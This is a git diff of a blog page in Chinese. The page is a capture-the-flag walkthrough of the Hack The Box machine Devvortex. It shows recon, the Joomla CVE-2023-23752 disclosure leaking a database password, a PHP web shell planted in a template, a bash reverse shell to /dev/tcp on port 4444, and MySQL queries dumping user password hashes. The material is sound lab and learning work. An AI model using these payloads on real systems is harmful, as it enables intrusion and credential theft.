@@ -18,7 +18,7 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"dawoxiansigema.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js" defer></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"dawoxiansigema.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js" defer></script>
 
     <meta name="description" content="Devvortex is an easy-difficulty Linux machine that features a Joomla CMS that is vulnerable to information disclosure. Accessing the service’s configuration file reveals plaintext credentials that lea">
 <meta property="og:type" content="article">
@@ -232,59 +232,258 @@
 <span id="more"></span>
 
 <h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><p>对于开放的端口而言 并没有太多值得需要关注的地方 又是网站服务80端口起手</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">❯ nmap -sCV -p22,80 10.10.11.242</span><br><span class="line">Starting Nmap 7.98 ( https://nmap.org ) at 2025-09-15 23:38 +0800</span><br><span class="line">Nmap scan report for devvortex.htb (10.10.11.242)</span><br><span class="line">Host is up (0.34s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)</span><br><span class="line">|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)</span><br><span class="line">|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: DevVortex</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 19.91 seconds</span><br></pre></td></tr></table></figure>
+<pre><code>❯ nmap -sCV -p22,80 10.10.11.242
+Starting Nmap 7.98 ( https://nmap.org ) at 2025-09-15 23:38 +0800
+Nmap scan report for devvortex.htb (10.10.11.242)
+Host is up (0.34s latency).
 
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: DevVortex
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.91 seconds
+</code></pre>
 <p>进入web服务之后 并不能找到合适的攻击点 下方的输入框也没有什么头绪 下一步还是HTB提供的思路去寻找子域名 也是学到了</p>
 <p><img src="/2025/09/15/Devvortex/1.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">❯ proxychains ffuf -w subdomains-1000.txt -u http://10.10.11.242 -H &#x27;Host: FUZZ.devvortex.htb&#x27;</span><br><span class="line">[proxychains] config file found: /Users/joe/proxychains-ng/proxychains.conf</span><br><span class="line">[proxychains] preloading /Users/joe/proxychains-ng/libproxychains4.dylib</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17-git-4-gce07eaa</span><br><span class="line"></span><br><span class="line">        /&#x27;___\  /&#x27;___\           /&#x27;___\</span><br><span class="line">       /\ \__/ /\ \__/  __  __  /\ \__/</span><br><span class="line">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span><br><span class="line">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span><br><span class="line">         \ \_\   \ \_\  \ \____/  \ \_\</span><br><span class="line">          \/_/    \/_/   \/___/    \/_/</span><br><span class="line"></span><br><span class="line">       v2.1.0-dev</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line"> :: Method           : GET</span><br><span class="line"> :: URL              : http://10.10.11.242</span><br><span class="line"> :: Wordlist         : FUZZ: /Users/joe/Documents/Red/SecDictionary/Subdomain_List/subdomains-1000.txt</span><br><span class="line"> :: Header           : Host: FUZZ.devvortex.htb</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 40</span><br><span class="line"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line">dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 601ms]</span><br></pre></td></tr></table></figure>
+<pre><code>❯ proxychains ffuf -w subdomains-1000.txt -u http://10.10.11.242 -H &#39;Host: FUZZ.devvortex.htb&#39;
+[proxychains] config file found: /Users/joe/proxychains-ng/proxychains.conf
+[proxychains] preloading /Users/joe/proxychains-ng/libproxychains4.dylib
+[proxychains] DLL init: proxychains-ng 4.17-git-4-gce07eaa
 
+        /&#39;___\  /&#39;___\           /&#39;___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.242
+ :: Wordlist         : FUZZ: /Users/joe/Documents/Red/SecDictionary/Subdomain_List/subdomains-1000.txt
+ :: Header           : Host: FUZZ.devvortex.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 601ms]
+</code></pre>
 <p>发现以dev开头的子域名 加入hosts以访问</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.242 devvortex.htb dev.devvortex.htb</span><br></pre></td></tr></table></figure>
-
+<pre><code>10.10.11.242 devvortex.htb dev.devvortex.htb
+</code></pre>
 <p>成功访问之后发现页脚里和源代码里都没有写到对应的框架信息(至少我没找到) 遂使用CmsVulScan扫描一下框架信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">❯ python3 CmsVulScan.py -u http://dev.devvortex.htb</span><br><span class="line"></span><br><span class="line">  _____        _   __     ______</span><br><span class="line"> / ___/_ _  __| | / /_ __/ / __/______ ____</span><br><span class="line">/ /__/  &#x27; \(_-&lt; |/ / // / /\ \/ __/ _ `/ _ \</span><br><span class="line">\___/_/_/_/___/___/\_,_/_/___/\__/\_,_/_//_/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[00:22:07] [*] Check whether the payload file exists</span><br><span class="line">[00:22:07] [*] All Payload 18780 duplicate removal 6935</span><br><span class="line">[00:22:07] [+] Payload load the success</span><br><span class="line">[00:22:07] [*] CMS recognition of http://dev.devvortex.htb in progress</span><br><span class="line">[00:22:07] [*] Scanning by MD5 mode......</span><br><span class="line">[00:24:17] [*] MD5: 3725/3725</span><br><span class="line">[00:24:17] [*] Scanning by RE mode......</span><br><span class="line">[00:24:19] [*] RE: 49/2868</span><br><span class="line">[00:24:19] [+] Using RE to discover the CMS in path /administrator/components/com_login/login.xml: Joomla(逐浪)</span><br></pre></td></tr></table></figure>
+<pre><code>❯ python3 CmsVulScan.py -u http://dev.devvortex.htb
 
+  _____        _   __     ______
+ / ___/_ _  __| | / /_ __/ / __/______ ____
+/ /__/  &#39; \(_-&lt; |/ / // / /\ \/ __/ _ `/ _ \
+\___/_/_/_/___/___/\_,_/_/___/\__/\_,_/_//_/
+
+
+
+[00:22:07] [*] Check whether the payload file exists
+[00:22:07] [*] All Payload 18780 duplicate removal 6935
+[00:22:07] [+] Payload load the success
+[00:22:07] [*] CMS recognition of http://dev.devvortex.htb in progress
+[00:22:07] [*] Scanning by MD5 mode......
+[00:24:17] [*] MD5: 3725/3725
+[00:24:17] [*] Scanning by RE mode......
+[00:24:19] [*] RE: 49/2868
+[00:24:19] [+] Using RE to discover the CMS in path /administrator/components/com_login/login.xml: Joomla(逐浪)
+</code></pre>
 <p>确实是Joomla 那么接下来获取版本 直接访问&#x2F;administrator在页脚也没有看到版本信息 那么去msfconsole看下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search joomla</span><br><span class="line">14  auxiliary/scanner/http/joomla_version</span><br><span class="line">msf &gt; use auxiliary/scanner/http/joomla_version</span><br><span class="line">msf auxiliary(scanner/http/joomla_version) &gt; set rhosts http://dev.devvortex.htb/</span><br><span class="line">rhosts =&gt; http://dev.devvortex.htb/</span><br><span class="line">msf auxiliary(scanner/http/joomla_version) &gt; run</span><br><span class="line">[*] Server: nginx/1.18.0 (Ubuntu)</span><br><span class="line">[+] Joomla version: 4.2.6</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
-
+<pre><code>msf &gt; search joomla
+14  auxiliary/scanner/http/joomla_version
+msf &gt; use auxiliary/scanner/http/joomla_version
+msf auxiliary(scanner/http/joomla_version) &gt; set rhosts http://dev.devvortex.htb/
+rhosts =&gt; http://dev.devvortex.htb/
+msf auxiliary(scanner/http/joomla_version) &gt; run
+[*] Server: nginx/1.18.0 (Ubuntu)
+[+] Joomla version: 4.2.6
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</code></pre>
 <p>成功获取该joomla版本为4.2.6</p>
 <h1 id="Shell-as-logan"><a href="#Shell-as-logan" class="headerlink" title="Shell as logan"></a>Shell as logan</h1><h2 id="CVE-2023-23752"><a href="#CVE-2023-23752" class="headerlink" title="CVE-2023-23752"></a>CVE-2023-23752</h2><p>既然知道了框架 那搜一下关于他的洞 发现没有4.2.6的 但是有个比他高一点的4.2.8 那就试一下好啦</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ searchsploit joomla | grep 4.2</span><br><span class="line">Joomla! v4.2.8 - Unauthenticated information disclosure             | php/webapps/51334.py</span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ searchsploit -x php/webapps/51334.py</span><br><span class="line"></span><br><span class="line">#!/usr/bin/env ruby</span><br><span class="line"></span><br><span class="line"># Exploit</span><br><span class="line">## Title: Joomla! v4.2.8 - Unauthenticated information disclosure</span><br><span class="line">## Exploit author: noraj (Alexandre ZANNI) for ACCEIS (https://www.acceis.fr)</span><br><span class="line">## Author website: https://pwn.by/noraj/</span><br><span class="line">## Exploit source: https://github.com/Acceis/exploit-CVE-2023-23752</span><br><span class="line">## Date: 2023-03-24</span><br><span class="line">## Vendor Homepage: https://www.joomla.org/</span><br><span class="line">## Software Link: https://downloads.joomla.org/cms/joomla4/4-2-7/Joomla_4-2-7-Stable-Full_Package.tar.gz?format=gz</span><br><span class="line">## Version: 4.0.0 &lt; 4.2.8 (it means from 4.0.0 up to 4.2.7)</span><br></pre></td></tr></table></figure>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ searchsploit joomla | grep 4.2
+Joomla! v4.2.8 - Unauthenticated information disclosure             | php/webapps/51334.py
+┌──(kali㉿kali)-[~]
+└─$ searchsploit -x php/webapps/51334.py
 
+#!/usr/bin/env ruby
+
+# Exploit
+## Title: Joomla! v4.2.8 - Unauthenticated information disclosure
+## Exploit author: noraj (Alexandre ZANNI) for ACCEIS (https://www.acceis.fr)
+## Author website: https://pwn.by/noraj/
+## Exploit source: https://github.com/Acceis/exploit-CVE-2023-23752
+## Date: 2023-03-24
+## Vendor Homepage: https://www.joomla.org/
+## Software Link: https://downloads.joomla.org/cms/joomla4/4-2-7/Joomla_4-2-7-Stable-Full_Package.tar.gz?format=gz
+## Version: 4.0.0 &lt; 4.2.8 (it means from 4.0.0 up to 4.2.7)
+</code></pre>
 <p>发现确实是4.0.0到4.2.8都可以通用的漏洞 那么就用msfconsole着手吧</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use cve:2023-23752</span><br><span class="line">msf auxiliary(scanner/http/joomla_api_improper_access_checks) &gt; set rhosts http://dev.devvortex.htb/</span><br><span class="line">rhosts =&gt; http://dev.devvortex.htb/</span><br><span class="line">msf auxiliary(scanner/http/joomla_api_improper_access_checks) &gt; run</span><br><span class="line">[+] Users JSON saved to /Users/joe/.msf4/loot/20250916125947_default_10.10.11.242_joomla.users_856850.bin</span><br><span class="line">[+] Joomla Users</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"> ID   Super User  Name        Username  Email       Send Email  Register D  Last Visit   Group Names</span><br><span class="line">                                                                ate         Date</span><br><span class="line"> --   ----------  ----        --------  -----       ----------  ----------  -----------  -----------</span><br><span class="line"> 649  *           lewis       lewis     lewis@devv  1           2023-09-25  2023-10-29   Super Users</span><br><span class="line">                                        ortex.htb                16:44:24   16:18:50</span><br><span class="line"> 650              logan paul  logan     logan@devv  0           2023-09-26               Registered</span><br><span class="line">                                        ortex.htb                19:15:42</span><br><span class="line"></span><br><span class="line">[+] Config JSON saved to /Users/joe/.msf4/loot/20250916125948_default_10.10.11.242_joomla.config_972795.bin</span><br><span class="line">[+] Joomla Config</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line"> Setting        Value</span><br><span class="line"> -------        -----</span><br><span class="line"> db encryption  0</span><br><span class="line"> db host        localhost</span><br><span class="line"> db name        joomla</span><br><span class="line"> db password    P4ntherg0t1n5r3c0n##</span><br><span class="line"> db prefix      sd4fg_</span><br><span class="line"> db user        lewis</span><br><span class="line"> dbtype         mysqli</span><br></pre></td></tr></table></figure>
+<pre><code>msf &gt; use cve:2023-23752
+msf auxiliary(scanner/http/joomla_api_improper_access_checks) &gt; set rhosts http://dev.devvortex.htb/
+rhosts =&gt; http://dev.devvortex.htb/
+msf auxiliary(scanner/http/joomla_api_improper_access_checks) &gt; run
+[+] Users JSON saved to /Users/joe/.msf4/loot/20250916125947_default_10.10.11.242_joomla.users_856850.bin
+[+] Joomla Users
+============
 
+ ID   Super User  Name        Username  Email       Send Email  Register D  Last Visit   Group Names
+                                                                ate         Date
+ --   ----------  ----        --------  -----       ----------  ----------  -----------  -----------
+ 649  *           lewis       lewis     lewis@devv  1           2023-09-25  2023-10-29   Super Users
+                                        ortex.htb                16:44:24   16:18:50
+ 650              logan paul  logan     logan@devv  0           2023-09-26               Registered
+                                        ortex.htb                19:15:42
+
+[+] Config JSON saved to /Users/joe/.msf4/loot/20250916125948_default_10.10.11.242_joomla.config_972795.bin
+[+] Joomla Config
+=============
+
+ Setting        Value
+ -------        -----
+ db encryption  0
+ db host        localhost
+ db name        joomla
+ db password    P4ntherg0t1n5r3c0n##
+ db prefix      sd4fg_
+ db user        lewis
+ dbtype         mysqli
+</code></pre>
 <p>可以正常打通获取信息 就是不知道为什么下面还是接了一连串的报错 尝试直接连接数据库发现是连不上的 可能没有开启远程连接 好在可以复用为登陆账号密码</p>
 <h2 id="Templates修改"><a href="#Templates修改" class="headerlink" title="Templates修改"></a>Templates修改</h2><p><img src="/2025/09/15/Devvortex/2.png"></p>
 <p>进来之后一把梭的CVE应该是再没了 后来也是学习了一下joomla框架 发现System&#x2F;Templates&#x2F;Site Templates里面可以编辑框架模版 并且是实时更新的 那么看看能不能给他加点啥</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @package     Joomla.Site</span><br><span class="line"> * @subpackage  Templates.cassiopeia</span><br><span class="line"> *</span><br><span class="line"> * @copyright   (C) 2017 Open Source Matters, Inc. &lt;https://www.joomla.org&gt;</span><br><span class="line"> * @license     GNU General Public License version 2 or later; see LICENSE.txt</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">defined(&#x27;_JEXEC&#x27;) or die;</span><br><span class="line"></span><br><span class="line">if (isset($_REQUEST[&#x27;hack&#x27;]))&#123;</span><br><span class="line">  system($_REQUEST[&#x27;hack&#x27;]);</span><br><span class="line">  die();</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;?php
 
+/**
+ * @package     Joomla.Site
+ * @subpackage  Templates.cassiopeia
+ *
+ * @copyright   (C) 2017 Open Source Matters, Inc. &lt;https://www.joomla.org&gt;
+ * @license     GNU General Public License version 2 or later; see LICENSE.txt
+ */
+
+defined(&#39;_JEXEC&#39;) or die;
+
+if (isset($_REQUEST[&#39;hack&#39;]))&#123;
+  system($_REQUEST[&#39;hack&#39;]);
+  die();
+&#125;
+...
+</code></pre>
 <p>对index.php我们因为权限并不能修改 但是发现了error.php这个漏网之鱼 修改之后弹个shell</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://dev.devvortex.htb/hack?hack=bash -c &quot;bash -i &gt;%26 /dev/tcp/10.10.*.*/4444 0&gt;%261&quot;</span><br><span class="line"></span><br><span class="line">❯ nc -lvn 4444</span><br><span class="line">bash: cannot set terminal process group (871): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">www-data@devvortex:~/dev.devvortex.htb$ python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">&lt;tb$ python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">www-data@devvortex:~/dev.devvortex.htb$</span><br><span class="line">//连接后使用python升级shell</span><br></pre></td></tr></table></figure>
+<pre><code>http://dev.devvortex.htb/hack?hack=bash -c &quot;bash -i &gt;%26 /dev/tcp/10.10.*.*/4444 0&gt;%261&quot;
 
+❯ nc -lvn 4444
+bash: cannot set terminal process group (871): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@devvortex:~/dev.devvortex.htb$ python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+&lt;tb$ python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+www-data@devvortex:~/dev.devvortex.htb$
+//连接后使用python升级shell
+</code></pre>
 <h2 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a>Hashcat</h2><p>连接之后发现home下只有logan用户 尝试使用之前的lewis&#x2F;P4ntherg0t1n5r3c0n##用户密码无法ssh连接 后来想起来之前的数据库还没有连接过 尝试使用mysql连接数据库</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@devvortex:~/dev.devvortex.htb$ mysql -u lewis -p&#x27;P4ntherg0t1n5r3c0n##&#x27; joomla</span><br><span class="line">&lt;htb$ mysql -u lewis -p&#x27;P4ntherg0t1n5r3c0n##&#x27; joomla</span><br><span class="line">...</span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>www-data@devvortex:~/dev.devvortex.htb$ mysql -u lewis -p&#39;P4ntherg0t1n5r3c0n##&#39; joomla
+&lt;htb$ mysql -u lewis -p&#39;P4ntherg0t1n5r3c0n##&#39; joomla
+...
+Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.
 
+mysql&gt;
+</code></pre>
 <p>ok成功连接上 就不开远程连接了 直接干terminal好了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; describe sd4fg_users;</span><br><span class="line">+---------------+---------------+------+-----+---------+----------------+</span><br><span class="line">| Field         | Type          | Null | Key | Default | Extra          |</span><br><span class="line">+---------------+---------------+------+-----+---------+----------------+</span><br><span class="line">| id            | int           | NO   | PRI | NULL    | auto_increment |</span><br><span class="line">| name          | varchar(400)  | NO   | MUL |         |                |</span><br><span class="line">| username      | varchar(150)  | NO   | UNI |         |                |</span><br><span class="line">| email         | varchar(100)  | NO   | MUL |         |                |</span><br><span class="line">| password      | varchar(100)  | NO   |     |         |                |</span><br><span class="line">| block         | tinyint       | NO   | MUL | 0       |                |</span><br><span class="line">| sendEmail     | tinyint       | YES  |     | 0       |                |</span><br><span class="line">| registerDate  | datetime      | NO   |     | NULL    |                |</span><br><span class="line">| lastvisitDate | datetime      | YES  |     | NULL    |                |</span><br><span class="line">| activation    | varchar(100)  | NO   |     |         |                |</span><br><span class="line">| params        | text          | NO   |     | NULL    |                |</span><br><span class="line">| lastResetTime | datetime      | YES  |     | NULL    |                |</span><br><span class="line">| resetCount    | int           | NO   |     | 0       |                |</span><br><span class="line">| otpKey        | varchar(1000) | NO   |     |         |                |</span><br><span class="line">| otep          | varchar(1000) | NO   |     |         |                |</span><br><span class="line">| requireReset  | tinyint       | NO   |     | 0       |                |</span><br><span class="line">| authProvider  | varchar(100)  | NO   |     |         |                |</span><br><span class="line">+---------------+---------------+------+-----+---------+----------------+</span><br><span class="line">17 rows in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select name,username,password from sd4fg_users;</span><br><span class="line">+------------+----------+--------------------------------------------------------------+</span><br><span class="line">| name       | username | password                                                     |</span><br><span class="line">+------------+----------+--------------------------------------------------------------+</span><br><span class="line">| lewis      | lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |</span><br><span class="line">| logan paul | logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |</span><br><span class="line">+------------+----------+--------------------------------------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<pre><code>mysql&gt; describe sd4fg_users;
++---------------+---------------+------+-----+---------+----------------+
+| Field         | Type          | Null | Key | Default | Extra          |
++---------------+---------------+------+-----+---------+----------------+
+| id            | int           | NO   | PRI | NULL    | auto_increment |
+| name          | varchar(400)  | NO   | MUL |         |                |
+| username      | varchar(150)  | NO   | UNI |         |                |
+| email         | varchar(100)  | NO   | MUL |         |                |
+| password      | varchar(100)  | NO   |     |         |                |
+| block         | tinyint       | NO   | MUL | 0       |                |
+| sendEmail     | tinyint       | YES  |     | 0       |                |
+| registerDate  | datetime      | NO   |     | NULL    |                |
+| lastvisitDate | datetime      | YES  |     | NULL    |                |
+| activation    | varchar(100)  | NO   |     |         |                |
